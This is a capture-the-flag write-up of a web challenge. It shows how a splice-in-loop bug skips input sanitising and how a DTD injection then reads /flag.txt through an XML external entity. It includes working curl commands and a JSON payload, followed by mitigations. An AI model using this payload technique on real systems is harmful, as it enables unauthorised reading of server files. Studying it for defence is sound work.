# XO XO Exploit — Web (Very Easy)

## TL;DR

The `/createSongCards` endpoint builds an XML document by pasting user input directly into an internal DTD (`<!ENTITY ...>` declarations), then parses it with `libxmljs` with entity replacement enabled. A blacklist stops obvious XXE keywords, but the blacklist is only applied in a loop that has an index bug: deleting an element with `splice()` while iterating makes the element right after it get skipped, so it never gets validated. We put the XXE payload in that skipped element and read `/flag.txt` through an external entity.

## Recon

The app is a small Express server on port 1337 (`index.js`). The interesting parts:

1. `sanitizeInput()` rejects any field containing `<!`, `SYSTEM`, `ENTITY`, `DOCTYPE`, `xmlns`, `xsi:`, `schemaLocation`, and similar.
2. `/createSongCards` requires at least 3 songs and removes any song whose artist contains `drake` or `drizzy`.
3. The song fields are interpolated into a DTD:

```js
const xml = `<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE songCard [
        <!ENTITY songName "${song.songName}">
        <!ENTITY artist "${song.artist}">
        <!ENTITY thoughts "${song.thoughts}">]>
    <songCard>
        ...
        <songName>&songName;</songName>
        <artist>&artist;</artist>
        <thoughts>&thoughts;</thoughts>
        ...`;
const doc = libxmljs.parseXml(xml, { replaceEntities: true });
```

The fields land inside quoted entity values, so an attacker who can break out of the quotes can declare their own entities. Declaring an external entity needs `SYSTEM`, and the blacklist forbids it, so this is the wall the bypass has to get past.

## Vulnerability 1: the validation loop skips elements

```js
for (var i = 0; i < songs.length; i++) {
    const song = songs[i];
    // ... validation: types, length, sanitizeInput() ...

    if (song.artist.toLowerCase().includes('drizzy') ||
        song.artist.toLowerCase().includes('drake')) {
        songs.splice(i, 1);   // removes element i
        continue;             // i++ -> skips the element that just moved into i
    }
}
```

When a Drake song is at index `i`, `splice(i, 1)` shifts the next element into slot `i`. The loop then increments `i`, so that next element is never visited. It is never validated by `sanitizeInput()` and never checked for the artist filter either. It still gets written to the XML in the final loop.

The length check (`songs.length < 3`) runs before the loop, so we can send three items and still end up with only two after the splice.

## Vulnerability 2: XXE through the DTD

Once `sanitizeInput()` is skipped, the injected field can close the `songName` declaration and add its own:

```
songName = a"> <!ENTITY flag SYSTEM "file:///flag.txt"> <!ENTITY x "b
```

Interpolated into the template, the DTD becomes:

```xml
<!ENTITY songName "a"> <!ENTITY flag SYSTEM "file:///flag.txt"> <!ENTITY x "b">
<!ENTITY artist "x">
<!ENTITY thoughts "&flag;">
```

- `songName` is `a`, and the injected `flag` entity is an external entity pointing at `/flag.txt`.
- `thoughts` is `&flag;`, so `&thoughts;` in the content expands to the file contents.

`replaceEntities: true` makes libxml2 resolve the external entity, and the result is saved into the user's song list.

## Exploit

Register a user (this also sets the auth cookie), then send three songs in one JSON array. The first is the Drake song that triggers the `splice`. The second is the skipped payload. The third is a normal song so the request is valid.

```bash
TARGET=http://localhost:1337

# 1. Register and keep the auth cookie
curl -s -c cookies.txt -H 'Content-Type: application/json' \
  -d '{"username":"hacker1","password":"password123","confirmPassword":"password123"}' \
  $TARGET/api/register

# 2. Send the payload
curl -s -b cookies.txt -H 'Content-Type: application/json' \
  -X POST $TARGET/createSongCards \
  -d '[
    {"songName":"Bad Song","artist":"Drake","thoughts":"skip me"},
    {"songName":"a\"> <!ENTITY flag SYSTEM \"file:///flag.txt\"> <!ENTITY x \"b","artist":"x","thoughts":"&flag;"},
    {"songName":"Normal Song","artist":"Some Artist","thoughts":"Nice track"}
  ]'

# 3. Read the flag back from the song list
curl -s -b cookies.txt $TARGET/api/songs | python3 -m json.tool
```

Expected: the `thoughts` field of the injected card contains the flag from `/flag.txt`.

The same can be done in the browser: log in or register, open the dashboard, fill three song entries (the first with artist "Drake", the second with the payload in its Song Name field), and submit. `curl` is simpler because it lets you control the exact JSON array.

## Why it works

| Step | Behavior |
|---|---|
| Drake item at index 0 | Validated, then spliced out |
| Payload moves to index 0 | Loop increments past it: no `sanitizeInput()`, no checks |
| Payload written to DTD | Breaks out of the quoted literal and declares `flag` as `SYSTEM "file:///flag.txt"` |
| `&thoughts;` in content | Expands to `&flag;`, which resolves to the file |
| `replaceEntities: true` | libxml2 loads the external entity and returns its text |

## Mitigations

- Don't build XML by string concatenation. Use a parser with DTDs and external entities disabled (`noent: false`, `nonet: true`, and no `DOCTYPE` in user-influenced documents).
- Don't use a blacklist for XML. Escape or reject the characters that matter (`"`, `<`, `&`) for the context, or pass values as data, not markup.
- Fix the loop: iterate with `filter()` or a reverse loop, and validate every element before filtering it, not after.
- Keep `replaceEntities` off unless it's really needed.

## Flag

Read from `/flag.txt` on the server through the injected external entity.
